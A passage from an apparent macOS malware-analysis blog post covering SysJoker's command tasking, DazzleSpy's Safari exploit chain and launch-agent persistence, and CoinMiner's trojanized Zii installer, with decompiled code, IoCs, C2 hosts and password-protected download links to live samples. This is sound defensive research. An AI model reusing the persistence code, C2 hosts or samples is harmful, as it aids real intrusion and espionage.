0x7fda91cafef0: "serial=user_x&name=user&os=os&anti=av&ip=ip&user_token=987217232"

</pre>
</div>
<p>While this (brief) survey information contains the name of the logged in user (<code>user</code> on my analysis VM), other fields seems to be unset (<code>ip=ip</code>), or hard coded (e.g. <code>987217232</code>).</p>
<p>Aside from this basic survey &ldquo;capability&rdquo; <code>SysJoker</code> supports a command to download and execute a binary, as well as running arbitrary commands:</p>
<p>The Intezer <a href="https://www.intezer.com/blog/malware-analysis/new-backdoor-sysjoker/">report</a> notes that all versions (Linux, Windows, and Mac) support commands named <code>exec</code> and <code>cmd</code>:</p>
<blockquote>
  "<i>[the exec] command is in charge of dropping and running an executable. SysJoker will receive a URL to a zip file, a directory for the path the file should be dropped to, and a filename that the malware should use on the extracted executable. It will download this file, unzip it and execute it.</i>"
  <br>
  <br>
  <i>[the cmd] command is in charge of running a command and uploading its response to the C2.</i>" -Intezer 
</blockquote>
<p>Disassembling the Mac version of <code>SysJoker</code>, we find the function (at <code>0x0000000100005f80</code>) responsible for parsing the tasking from the command and control server, including the aforementioned <code>exec</code> and <code>cmd</code> commands.</p>
<p>First, the <code>exec</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_100005f80</span>(...) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    rax <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>__1<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">::</span>compare(<span style="color:#f92672">&amp;</span>var_E0, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0xffffffffffffffff</span>, <span style="color:#e6db74">&#34;exe&#34;</span>, <span style="color:#ae81ff">0x3</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> handleExec;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>handleExec:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  rax <span style="color:#f92672">=</span> sub_100004e76(<span style="color:#f92672">&amp;</span>var_60, <span style="color:#e6db74">&#34;url&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>  rax <span style="color:#f92672">=</span> sub_100004e76(<span style="color:#f92672">&amp;</span>var_60, <span style="color:#e6db74">&#34;dir&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  rax <span style="color:#f92672">=</span> sub_100004e76(<span style="color:#f92672">&amp;</span>var_60, <span style="color:#e6db74">&#34;name&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  ...     
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>}</span></span></code></pre></div>
<p>In the above disassembly you can see that if malware is tasked with the <code>exec</code> command, it will first extract the command&rsquo;s parameters (<code>url</code>, <code>dir</code>, <code>name</code>, etc.).</p>
<p>The code to then unzip the downloaded executable and execute it, appears at <code>sub_100003995</code>. This function invokes:</p>
<ul>
<li><code>unzip -o</code> to unzip the executable,</li>
<li><code>chmod 0777</code> to change the permissions (on the now unzipped executable)</li>
<li><code>system</code> to execute the binary.</li>
</ul>
<p>The function (at <code>0x0000000100005f80</code>) is also responsible for handling the <code>cmd</code> command. In the following disassembly the malware first looks for the string <code>cmd</code> coming from the command &amp; control server. If tasked with this command it invokes an unnamed subroutine (<code>sub_100004e76</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_100005f80</span>(...) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    rax <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">::</span>compare(<span style="color:#f92672">&amp;</span>var_E0, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0xffffffffffffffff</span>, <span style="color:#e6db74">&#34;cmd&#34;</span>, <span style="color:#ae81ff">0x3</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>     ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>     rax <span style="color:#f92672">=</span> sub_100004e76(<span style="color:#f92672">&amp;</span>var_60, <span style="color:#e6db74">&#34;command&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>     ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>}</span></span></code></pre></div>
<p>After extracting the commands parameter (<code>command</code>), it appears to invoke the <code>popen</code> API (via a helper function found at <code>0x000000010000256b</code>), to execute the command. As noted by Intezer, the results of the executed command will be uploaded to the command and control server.</p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>SysJoker</code> include the following (credit: Intezer):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li><code>/Library/MacOsServices/updateMacOs</code>:<br>
<code>1a9a5c797777f37463b44de2b49a7f95abca786db3977dcdac0f79da739c08ac</code>
<code>fe99db3268e058e1204aff679e0726dc77fd45d06757a5fda9eafc6a28cfb8df</code>
<code>d0febda3a3d2d68b0374c26784198dc4309dbe4a8978e44bb7584fd832c325f0</code></li>
</ul>
</li>
<li>
<p>Files/Directories:</p>
<ul>
<li><code>/Library/MacOsServices</code></li>
<li><code>/Library/LaunchAgents/com.apple.update.plist</code></li>
</ul>
</li>
<li>
<p>Command and Control Servers:</p>
<ul>
<li><code>bookitlab.tech</code></li>
<li><code>winaudio-tools.com</code></li>
<li><code>graphic-updater.com</code></li>
<li><code>github.url-mini.com</code></li>
<li><code>office360-update.com</code>
<br></li>
</ul>
</li>
</ul>
<h3 id="-dazzlespy">üëæ <strong><code>DazzleSpy</code></strong></h3>
<div class="note">
<p>A feature complete cyber-espionage implant, DazzleSpy was deployed via a Safari (0day?) exploit and targeted pro-democracy protestors.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/DazzleSpy.zip"><code>DazzleSpy</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>Researchers <a href="https://twitter.com/marc_etienne_">Marc-Etienne M.L√©veill√©</a> and <a href="https://twitter.com/cherepanov74">Anton Cherepanov</a> of ESET discovered DazzledSpy. They published their findings and research in an excellent writeup detailed: &ldquo;<a href="https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/">Watering hole deploys new macOS malware, DazzleSpy, in Asia</a>&rdquo;:</p>
<img src="../images/blog/blog_0x6D/eset.png"  width="100%" class="center" style="border-radius: 4px;">

<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p>&ldquo;<a href="https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/">Watering hole deploys new macOS malware, DazzleSpy, in Asia</a>&rdquo;</p>
</li>
<li>
<p>&ldquo;<a href="https://objective-see.org/blog/blog_0x6D.html">Analyzing OSX.DazzleSpy: A Fully-featured Cyber-espionage macOS Implant</a>&rdquo;</p>
</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Safari Exploit </span></p>
<p>Its rather uncommon to discover Mac malware that is deployed by means of a browser exploit &hellip;but this is exactly how DazzleSpy was able to infect its victims, as ESET notes:
<blockquote>
  "<i>[A] Hong Kong pro-democracy radio station website [was] compromised to serve a Safari exploit that installed cyberespionage malware on site visitors' Macs. Here we provide a breakdown of the WebKit exploit used to compromise Mac users and an analysis of the payload, which is a new malware family targeting macOS.</i>" -ESET 
</blockquote></p>
<p>To infect Mac users, the attackers first compromised a legitimate website and injected an iFrame containing an exploit chain.</p>
<p>The ESET researchers noted the exploit chain would first check the installed version of macOS, attempting to exploit users running macOS 10.15.2 or newer. The complex exploit code was found in a file named <code>mac.js</code>. This would exploit what appeared to be <code>CVE-2021-1789</code>. Then upon success (read: initial code execution), would exploit a privilege escalation vulnerability (<code>CVE-2021-30869</code>) to escape the Safari sandbox and gain root. Finally the exploit chain would complete, but downloading and decrypting payload: <code>DazzleSpy</code>.</p>
<p>For more details on this rather involved exploitation chain, see either ESET&rsquo;s <a href="https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/">report</a> or the Google TAG report, &ldquo;<a href="https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/">Analyzing a watering hole campaign using macOS exploits</a>&rdquo;.
<br>
<br></p>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Agent</span>
</p>
<p>The ESET researchers noted:</p>
<blockquote>
  "<i>In order to persist on the compromised device, the malware adds a Property List file ... named com.apple.softwareupdate.plist to the LaunchAgents folder. The malware executable file is named softwareupdate and saved in the $HOME/.local/ folder.</i>" -ESET 
</blockquote>
<p>In output from the <code>strings</code> tool (run against the DazzleSpy binary named <code>softwareupdate</code>), one can see persistence-related strings such as <code>%@/Library/LaunchAgents</code> and <code>com.apple.softwareupdate.plist</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% strings - DazzleSpy/softwareupdate
...
%@/Library/LaunchAgents
/com.apple.softwareupdate.plist

launchctl unload %@
RunAtLoad
KeepAlive

</pre>
</div>
<p>In a disassembler, we find cross-references to these strings in the aforementioned <code>installDaemon</code> method (of the class named <code>Singleton</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">/* @class Singleton */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#f92672">+</span>(<span style="color:#66d9ef">void</span>)installDaemon {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>rax <span style="color:#f92672">=</span> NSHomeDirectory();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>var_78 <span style="color:#f92672">=</span> [NSString stringWithFormat:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;%@/Library/LaunchAgents&#34;</span>, rax];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>var_80 <span style="color:#f92672">=</span> [var_78 stringByAppendingFormat:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;/com.apple.softwareupdate.plist&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#66d9ef">if</span> ([var_70 fileExistsAtPath:var_78] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    [var_70 createDirectoryAtPath:var_78 withIntermediateDirectories:<span style="color:#ae81ff">0x1</span> ...];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>var_90 <span style="color:#f92672">=</span> [[NSMutableDictionary alloc] init];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>var_98 <span style="color:#f92672">=</span> [[NSMutableArray alloc] init];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>[var_98 addObject:var_38];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>[var_98 addObject:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;1&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>rax <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">@</span>(YES);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>[var_90 setObject:rax forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;RunAtLoad&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>rax <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">@</span>(YES);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>[var_90 setObject:rax forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;KeepAlive&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>rax <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">@</span>(YES);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>[var_90 setObject:rax forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;SuccessfulExit&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>[var_90 setObject:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;com.apple.softwareupdate&#34;</span> forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;Label&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>[var_90 setObject:var_98 forKey:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;ProgramArguments&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>[var_90 writeToFile:var_80 atomically:<span style="color:#ae81ff">0x0</span>];</span></span></code></pre></div>
<p>In the above decompilation, we first see the malware build the path to a launch agent plist (<code>~/Library/LaunchAgents/com.apple.softwareupdate.plist</code>).</p>
<p>Then, it initializes a dictionary for the launch agent plist, with various key value pairs (<code>RunAtLoad</code>, etc). Once initialized this dictionary is written out to the launch agent plist (<code>com.apple.softwareupdate.plist</code>).</p>
<p>We can passively observe the malware (recall, named <code>softwareupdate</code>) dynamically creating this plist via a <a href="https://objective-see.com/products/utilities.html#FileMonitor">File Monitor</a>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty
...
{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    "destination" : "/Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist",
    
    "process" : {
      "signing info (computed)" : {
        "signatureStatus" : -67062
      },
      "uid" : 501,
      "arguments" : [
        "/Users/user/Desktop/softwareupdate"
      ],
      "path" : "/Users/user/Desktop/softwareupdate",
      "pid" : 1469
    }
  }
}

</pre>
</div>
<p>Once the malware&rsquo;s launch agent&rsquo;s plist has been created, we can easily dump its contents:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% cat /Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
    &lt;key&gt;KeepAlive&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.apple.softwareupdate&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/Users/user/.local/softwareupdate&lt;/string&gt;
        &lt;string&gt;1&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;SuccessfulExit&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;

</pre>
</div>
<p>In the <code>ProgramArguments</code> key we can see the path to the persistent location of the malware: <code>~/.local/softwareupdate</code>. Also, as the <code>RunAtLoad</code> key is set to <code>true</code>, the malware will be automatically restarted each time the user logs in. Persistence achieved!
<br>
<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Fully-feature implant
</span>
</p>
<p>The ESET <a href="https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/">report</a> also describes the tasking (remote) commands that DazzleSpy supports. This includes everything you&rsquo;d expect to find in a cyber-espionage implant, including surveying the infected host, exfiltrating files, running commands, self-deletion.</p>
<img src="../images/blog/blog_0x71/dsCapabilities.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">DazzleSpy&#39;s Capabilities (image credit: ESET)</center>

<p>Interestingly, the malware (again, as noted by ESET), also supports more advanced features such as:</p>
<ul>
<li>
<p>The ability to search for files (via regex?)</p>
</li>
<li>
<p>The ability to start fully interactive remote desktop (RDP) session</p>
</li>
<li>
<p>The ability to dump the keychain (on systems vulnerable to <code>CVE-2019-8526</code>).</p>
</li>
</ul>
<div class="note">
<p>CVE-2019-8526 was found by Linus Henze, and presented at our very own #OBTS conference:</p>
<p>See:</p>
<center>
<a href="https://objectivebythesea.com/v2/talks/OBTS_v2_Henze.pdf">
      KeySteal: A Vulnerability in Apple's Keychain 
</a>
</center>
</div>
<p>The handling of remote commands (tasking) seems to be implemented in the <code>analysisData: Socket:</code> method. Here the malware looks for tasking commands from the command and control server, and then acts upon them. For example, here&rsquo;s the decompilation of the <code>run</code> command, which opens (&ldquo;runs&rdquo;) a specified file (&ldquo;path&rdquo;) via its default handler (via <code>NSWorkspace</code>&rsquo;s&rsquo; <code>openFile</code> API):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> (YES <span style="color:#f92672">==</span> [command isEqualToString:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;run&#34;</span>]) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    path <span style="color:#f92672">=</span> [var_888 objectForKeyedSubscript:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;path&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    [NSWorkspace.sharedWorkspace openFile:path];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>}</span></span></code></pre></div>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>DazzleSpy</code> include the following (credit: ESET):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li><code>~/.local/softwareupdate</code>: <br>
<code>f9ad42a9bd9ade188e997845cae1b0587bf496a35c3bffacd20fefe07860a348</code></li>
</ul>
</li>
<li>
<p>Files/Directories:</p>
<ul>
<li><code>~/.local</code></li>
<li><code>~/Library/LaunchAgents/com.apple.softwareupdate.plist</code></li>
</ul>
</li>
<li>
<p>Command and Control Servers:</p>
<ul>
<li><code>88.218.192.128:5633</code></li>
</ul>
</li>
</ul>
<br>
<h3 id="-coinminer">üëæ <strong><code>CoinMiner</code></strong></h3>
<div class="note">
<p>CoinMiner is a surreptitious crypto currency miner, leveraging various open-source components and I2P for stealthy encrypted communications.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/CoinMiner.zip"><code>CoinMiner</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In February, TrendMicro security researchers published a thorough write-up on a new crypto-currency miner (<code>CoinMiner</code>) titled &ldquo;<a href="https://www.trendmicro.com/en_us/research/22/b/latest-mac-coinminer-utilizes-open-source-binaries-and-the-i2p-network.html">Latest Mac Coinminer Utilizes Open-Source Binaries and the I2P Network</a>&rdquo;. As mentioned in the title of this write-up they described how the miner used various open-source components and I2P for its communications.</p>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>&ldquo;<a href="https://www.trendmicro.com/en_us/research/22/b/latest-mac-coinminer-utilizes-open-source-binaries-and-the-i2p-network.html">Latest Mac Coinminer Utilizes Open-Source Binaries and the I2P Network</a>&rdquo;</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> (likely) Trojanized Disk Images</span></p>
<p>The TrendMicro report states,</p>
<blockquote>
"We suspected that the Mach-O sample arrived packaged in a DMG (an Apple image format used to compress installers) for Adobe Photoshop CC 2019 v20.0.6" -TrendMicro
</blockquote>
<p>The report notes that this conclusion was reached due to a code snippet which (as part of the malware installation logic) would launch a binary from the hardcoded path: <code>/Volumes/Adobe Photoshop\ CC 2019\ v20.0.6/Adobe Zii\ 2019 4.4.2.app/Contents/MacOS/.Patch</code></p>
<p>Reversing one of the malware&rsquo;s binaries (<code>lauth</code>), this code is readily apparent the disassembly of the main function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(...) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    system(<span style="color:#e6db74">&#34;/Volumes/Adobe\ Photoshop\ CC\ 2019\ v20.0.6/Adobe\ Zii\ 2019\
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#e6db74">            4.4.2.app/Contents/MacOS/.Patch &amp;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>}</span></span></code></pre></div>
<p>Zii is well known patcher tool that claims to allow users to subvert Adobe products (Photoshop, etc) bypassing otherwise required registration and licensing checks. Its unsurprising that here hackers have packed inserted some malware as well.</p>
